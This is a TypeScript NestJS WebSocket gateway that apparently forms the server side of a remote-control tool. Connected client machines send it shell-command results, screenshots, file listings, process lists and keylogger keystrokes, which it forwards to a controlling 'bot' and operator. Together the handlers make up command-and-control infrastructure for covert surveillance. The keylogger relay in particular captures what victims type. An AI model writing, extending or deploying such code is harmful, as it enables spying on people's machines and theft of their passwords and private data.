import {
  OnGatewayConnection,
  OnGatewayDisconnect,
  SubscribeMessage,
  WebSocketGateway,
  WebSocketServer,
} from "@nestjs/websockets";
import { Server, Socket } from "socket.io";
import { WsClientJoinsUseCase } from "../application/ws-client-joins.use-case";
import { WsClientResetAllConnectionsUseCase } from "../application/ws-client-reset-all-connections-use-case";
import { LoggerService } from "../../shared/providers";
import { WsClientLeavesUseCase } from "../application/ws-client-leaves.use-case";
import { WsClientGuard } from "../application/ws-client.guard";
import type {
  GetExplorerFromClientEvent,
  RunCmdCommandEvent,
  TasksEvent,
  GetScreensFromClientEvent,
  RunCmdCommand,
  GetScreenshotFromClientEvent,
  GetKeyloggerFromClientEvent,
  MessageToBotEvent,
} from "../types/ws-client-events.type";
import type { FileRequest } from "../types/tasks.type";
import { UseGuards } from "@nestjs/common";
import { WsBotScreenshotUseCase } from "../../ws-bot/application/events/ws-bot-screenshot.use-case";
import { WsBotSendCommandUseCase } from "../../ws-bot/application/events/ws-bot-send-command.use-case";
import { WsClientFile } from "../application/events/ws-client-file";
import { WsBotSendExplorerUseCase } from "../../ws-bot/application/events/ws-bot-send-explorer.use-case";
import { WsBotSendTasksUseCase } from "../../ws-bot/application/events/ws-bot-send-tasks.use-case";
import Redis from "ioredis";
import { InjectRedis } from "@nestjs-modules/ioredis";
import path from "path";
import { RedisRepository } from "@/src/repository/redis/domain/redis.repository";
import { CommandsGuard } from "../../client/domain/commands.guard";
import { SetCommand } from "../../client/domain/commands.decorator";
import { WsBotKeyLoggerUseCase } from "../../ws-bot/application/events/ws-bot-keylogger.use-case";
import { WsBotSendMessageUseCase } from "../../ws-bot/application/events/ws-bot-send-message.use-case";

@WebSocketGateway({
  namespace: "clients",
  cors: true,
  maxHttpBufferSize: 1e8,
})
export class WsClientGateway
  implements OnGatewayConnection, OnGatewayDisconnect
{
  @WebSocketServer()
  server!: Server;
  constructor(
    private readonly wsClientJoinsUseCase: WsClientJoinsUseCase,
    private readonly wsClientLeavesUseCase: WsClientLeavesUseCase,
    private readonly wsClientResetAllConnectionsUseCase: WsClientResetAllConnectionsUseCase,
    private readonly wsBotScreenshotUseCase: WsBotScreenshotUseCase,

    private readonly wsBotSendTasksUseCase: WsBotSendTasksUseCase,
    private readonly wsBotSendCmdCommandUseCase: WsBotSendCommandUseCase,
    private readonly wsBotSendExplorerUseCase: WsBotSendExplorerUseCase,
    private readonly wsBotKeyloggerUseCase: WsBotKeyLoggerUseCase,
    private readonly wsBotSendMessageUseCase: WsBotSendMessageUseCase,
    private readonly logger: LoggerService,
    private readonly redisRepository: RedisRepository,
    @InjectRedis() private readonly redis: Redis,
  ) {}

  async sendEventToClient(clientid: string, event: string, payload?: any) {
    // const client = this.server.sockets.sockets.get(clientid);
    // console.log("client", client);
    // if (client) {
    //   client.emit(event, payload);
    // }

    const connectionid = await this.redisRepository.HGET(
      ["ws", [clientid]],
      "client",
    );

    // console.log("connectionid", connectionid);
    if (!connectionid) return;
    this.server.to(connectionid).emit(event, payload);
  }

  async afterInit(client: Socket) {
    this.logger.info("Resetting all client connections");
    await this.wsClientResetAllConnectionsUseCase.execute();
  }

  async handleConnection(client: Socket) {
    const { clientid } = await this.wsClientJoinsUseCase.execute(client);
    try {
      // console.log(this.server);

      // console.log("clientid", this.server.sockets);
      this.server.to(client.id).emit("connected", "connected");
    } catch (error) {
      this.logger.error("Connection error:", error);
      client.disconnect();
      return;
    }

    await this.redisRepository.HDEL(["client-commands-requests"], clientid);

    await this.redisRepository.HSET(["ws", [clientid]], {
      client: client.id,
    });
  }

  async handleDisconnect(client: Socket) {
    try {
      this.wsClientLeavesUseCase.execute(client);
      const clientid = client.handshake.query["clientid"] as string;
      const controllerid = client.handshake.query["controllerid"] as string;

      await this.redisRepository.HDEL(["ws", [clientid]], "client");
      await this.redisRepository.HDEL(["connection-ws"], controllerid);

      await this.redisRepository.HSET(["client-commands-requests"], {
        [clientid]: [],
      });
    } catch (error) {
      this.logger.error("Connection error:", error);
      client.disconnect();
    }
  }

  @UseGuards(WsClientGuard, CommandsGuard)
  @SetCommand("shell")
  @SubscribeMessage("runCmdCommand")
  runCmdCommand(client: Socket, data: RunCmdCommand) {
    this.wsBotSendCmdCommandUseCase.execute({
      controllerid: client.handshake.query.controllerid as string,
      ...data,
    });
  }

  @UseGuards(WsClientGuard, CommandsGuard)
  @SetCommand("screenshot")
  @SubscribeMessage("getScreensFromClient")
  async getScreensFromClient(client: Socket, data: GetScreensFromClientEvent) {
    this.logger.info("getScreensFromClient", data);

    const messageid = await this.redisRepository.HGET(
      ["messages-bot"],
      data.identifier,
    );

    this.wsBotScreenshotUseCase.sendScreens({
      controllerid: client.handshake.query.controllerid as string,
      screens: data.screens,
      identifier: messageid ?? "",
    });
  }

  @UseGuards(WsClientGuard, CommandsGuard)
  @SetCommand("screenshot")
  @SubscribeMessage("getScreenshotFromClient")
  getScreenshotFromClient(client: Socket, data: GetScreenshotFromClientEvent) {
    this.logger.info("getScreensFromClient");
    // this.wsBotSendScreensUseCase.execute({
    //   controllerid: client.handshake.query.controllerid as string,
    //   screens: data.screens,
    // });

    this.wsBotScreenshotUseCase.sendScreenshot({
      controllerid: client.handshake.query.controllerid as string,
      buffer: data.buffer,
    });
  }

  @UseGuards(WsClientGuard, CommandsGuard)
  @SetCommand("explorer")
  @SubscribeMessage("getFilesFolder")
  async getExplorerFromClient(
    client: Socket,
    data: GetExplorerFromClientEvent,
  ) {
    this.logger.info("getExplorerFromClient Event");

    const { files, folder, relativepath } = data;

    const { clientid } = client.handshake.query as {
      clientid: string;
      controllerid: string;
    };

    const splitedPath = relativepath.split("/")[1] ?? relativepath;

    const pathSplited = splitedPath.split(folder);

    console.log("pathSplited", pathSplited);
    let resultPath = "";
    if (pathSplited.length > 1) {
      resultPath = path.join(folder, pathSplited[1]);
      // const resultPath = path.join(folder, splitedPath);
    } else {
      resultPath = folder;
    }

    console.log("resultPath", resultPath);
    // const timeKey = `${key}:timestamp`;

    await this.redisRepository.HSET(
      ["explorer", [clientid]],
      {
        [resultPath]: JSON.stringify(files),
      },
      true,
    );

    this.wsBotSendExplorerUseCase.execute({
      controllerid: client.handshake.query.controllerid as string,
      ...data,
    });
  }

  @UseGuards(WsClientGuard)
  @SetCommand("process")
  @SubscribeMessage("getTasksFromClient")
  getTasksFromClient(client: Socket, data: TasksEvent) {
    this.wsBotSendTasksUseCase.execute({
      controllerid: client.handshake.query.controllerid as string,

      ...data,
    });
  }

  @UseGuards(WsClientGuard, CommandsGuard)
  @SetCommand("keylogger")
  @SubscribeMessage("keylogger:get-keys")
  getKeyloggerFromClient(client: Socket, data: GetKeyloggerFromClientEvent) {
    this.logger.info("getKeyloggerFromClient", data);

    this.wsBotKeyloggerUseCase.sendKeyLoggerToBot(
      client.handshake.query.controllerid as string,
      data.keys,
    );
  }

  @UseGuards(WsClientGuard)
  @SubscribeMessage("message")
  sendMessageToBot(client: Socket, data: MessageToBotEvent) {
    this.logger.info("Send message to bot", data);

    this.wsBotSendMessageUseCase.execute(
      client.handshake.query.controllerid as string,
      data,
    );
  }
}
